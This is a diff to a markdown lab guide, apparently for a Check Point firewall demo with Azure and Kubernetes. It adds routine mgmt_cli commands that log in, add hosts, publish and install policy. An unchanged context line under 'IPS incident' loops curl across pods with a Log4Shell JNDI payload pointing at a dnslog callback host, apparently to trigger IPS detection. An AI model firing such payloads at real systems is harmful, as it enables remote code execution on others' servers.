@@ -355,3 +355,36 @@ IPS incident
 for P in $(kubectl get pod -l 'app=web1' -o name); do kubectl exec -it $P -- curl 10.42.5.4 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' ; echo ; done
 
 ```
+
+Your CP IP
+```bash
+az vm list-ip-addresses -g rg-standalone-chkp -n chkp --query "[].virtualMachine.network.publicIpAddresses[*].ipAddress" --output tsv
+```
+
+Management API
+* https://sc1.checkpoint.com/documents/latest/APIs/#introduction~v1.9%20
+
+```bash
+MGMT_IP=$(az vm list-ip-addresses -g rg-standalone-chkp -n chkp --query "[].virtualMachine.network.publicIpAddresses[*].ipAddress" --output tsv)
+ssh "admin@${MGMT_IP}" 
+
+# use mgmt_cli
+session=`mgmt_cli -r true login --format json| jq -r '.sid'` 
+echo $session
+
+mgmt_cli --session-id $session  --format json show hosts
+
+mgmt_cli --session-id $session --format json add host name "New Host 1" ip-address "192.0.2.1"
+
+
+mgmt_cli show data-center-server name "Azure" --session-id $session --format json
+
+mgmt_cli show data-center-server name "K8S" --session-id $session --format json
+
+
+mgmt_cli publish --session-id $session  # publish all changes in one session. Publish occur only once
+
+mgmt_cli install-policy policy-package "Standard" access true threat-prevention true --session-id $session --format json
+
+mgmt_cli logout --session-id $session  # logout once
+```
